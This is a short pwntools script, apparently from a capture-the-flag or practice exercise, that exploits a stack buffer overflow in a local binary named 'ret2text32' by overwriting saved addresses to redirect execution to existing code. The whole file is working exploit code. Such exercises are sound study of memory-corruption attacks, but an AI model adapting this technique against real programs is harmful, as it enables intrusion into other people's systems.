from pwn import *

p = process('cmake-build-debug/ret2text32')
payload = 'a' * 0x6c + p32(0xffffcbc8 + 4) + p32(0x08048799 + 0x1867) + 'b' * 0x4 + p32(0x080486D0)
with open('ret2text32.payload', 'wb') as f:
    f.write(payload)
p.send(payload)
p.interactive()
